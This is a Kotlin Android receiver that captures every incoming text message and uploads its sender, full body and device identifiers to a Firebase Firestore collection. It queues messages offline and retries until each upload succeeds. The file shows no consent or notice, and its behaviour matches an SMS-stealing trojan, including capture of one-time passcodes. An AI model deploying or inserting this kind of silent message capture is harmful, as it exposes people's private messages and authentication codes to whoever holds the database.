package com.example.sms

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withTimeoutOrNull

/**
 * System-level SMS_RECEIVED receiver.
 * Uses goAsync() for immediate online synchronization while atomically saving to
 * OfflineSmsQueue so that messages received offline are never lost.
 */
class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = try {
            Telephony.Sms.Intents.getMessagesFromIntent(intent)
        } catch (e: Exception) {
            Log.w(TAG, "Standard SMS intent parser failed: ${e.message}")
            null
        } ?: parsePdusFallback(intent)

        if (messages.isNullOrEmpty()) return

        val parts = messages.filterNotNull()
        if (parts.isEmpty()) return

        val deviceId = SmsSyncHelper.resolveDeviceId(context)
        val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"

        val pendingResult = goAsync()

        CoroutineScope(Dispatchers.IO).launch {
            try {
                parts.groupBy { it.displayOriginatingAddress ?: "Unknown" }
                    .forEach { (sender, segments) ->
                        val body = segments.joinToString(separator = "") { it.messageBody ?: "" }
                        val timestamp = segments.maxOfOrNull { it.timestampMillis }
                            ?: System.currentTimeMillis()
                        val smsId = SmsSyncHelper.buildSmsId(deviceId, sender, body, timestamp)

                        if (OfflineSmsQueue.isSeen(context, smsId)) return@forEach
                        OfflineSmsQueue.markSeen(context, smsId)

                        // 1. Immediately persist to offline queue
                        val queued = QueuedSms(
                            id = smsId,
                            sender = sender,
                            body = body,
                            timestamp = timestamp,
                            deviceId = deviceId,
                            deviceModel = deviceModel
                        )
                        OfflineSmsQueue.enqueue(context, queued)

                        // 2. Attempt immediate online upload
                        var uploaded = false
                        try {
                            withTimeoutOrNull(4000L) {
                                val db = FirebaseFirestore.getInstance()
                                val payload = mapOf(
                                    "id" to smsId,
                                    "sender" to sender,
                                    "body" to body,
                                    "timestamp" to timestamp,
                                    "deviceId" to deviceId,
                                    "deviceModel" to deviceModel,
                                    "uploadedAt" to System.currentTimeMillis()
                                )
                                db.collection(SmsUploadWorker.COLLECTION)
                                    .document(smsId)
                                    .set(payload)
                                    .await()
                                uploaded = true
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "Immediate upload attempt failed: ${e.message}")
                        }

                        if (uploaded) {
                            OfflineSmsQueue.remove(context, smsId)
                            Log.d(TAG, "Instant SMS upload successful: $smsId")
                        } else {
                            // Ensure background worker is scheduled to drain when online
                            SmsSyncHelper.scheduleWorker(context)
                        }
                    }
            } catch (e: Exception) {
                Log.e(TAG, "Error in onReceive processing: ${e.message}")
                SmsSyncHelper.scheduleWorker(context)
            } finally {
                pendingResult.finish()
            }
        }
    }

    @Suppress("DEPRECATION")
    private fun parsePdusFallback(intent: Intent): Array<SmsMessage>? {
        return try {
            val bundle = intent.extras ?: return null
            val pdus = bundle.get("pdus") as? Array<*> ?: return null
            val format = bundle.getString("format")
            pdus.mapNotNull { pdu ->
                if (pdu !is ByteArray) return@mapNotNull null
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && format != null) {
                    SmsMessage.createFromPdu(pdu, format)
                } else {
                    SmsMessage.createFromPdu(pdu)
                }
            }.toTypedArray()
        } catch (e: Exception) {
            Log.w(TAG, "PDU fallback parser error: ${e.message}")
            null
        }
    }

    companion object {
        private const val TAG = "SmsReceiver"
    }
}
